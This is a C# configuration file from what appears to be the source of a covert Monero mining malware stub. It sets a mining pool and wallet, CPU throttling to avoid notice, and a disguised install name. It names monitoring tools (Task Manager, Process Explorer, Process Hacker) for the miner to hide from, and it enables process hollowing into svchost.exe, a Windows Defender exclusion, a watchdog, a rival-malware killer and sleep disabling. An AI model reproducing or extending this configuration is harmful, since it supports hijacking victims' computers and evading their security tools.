namespace MinerStub;
internal static class MinerConfig {
    public const string PoolUrl          = "xmr-eu1.nanopool.org:14433";
    public const bool   PoolTls          = true;
    public const string Wallet           = "YOUR_XMR_WALLET_ADDRESS";
    public const string Password         = "x";
    public const string WorkerName       = "worker1";
    public const string Algo             = "rx/0";
    public const int    MaxCpuIdle       = 75;
    public const int    MaxCpuActive     = 50;
    public const int    IdleThresholdSec = 30;
    public const string InstallName      = "windows";
    public const string StealthProcs     = "taskmgr.exe,procexp.exe,procexp64.exe,systeminformer.exe,processhacker.exe";
    public const bool   EnableStartup    = false;
    public const bool   EnableSafeBoot   = false;
    public const bool   EnableWatchdog   = true;
    public const bool   DisableSleep     = true;
    public const bool   EnableHollowing  = true;
    public const string HollowTarget     = "svchost.exe";
    public const bool   EnableBotKiller  = true;
    public const bool   EnableDefenderExclusion = true;
    public const string StatsUrl         = "";
    public const string StatsToken       = "";
    public const string SfcSeed          = "Bbi2/Abg4OSVd/Q5LU272tDRKX2SY91txs8Q+aAToi4=";
}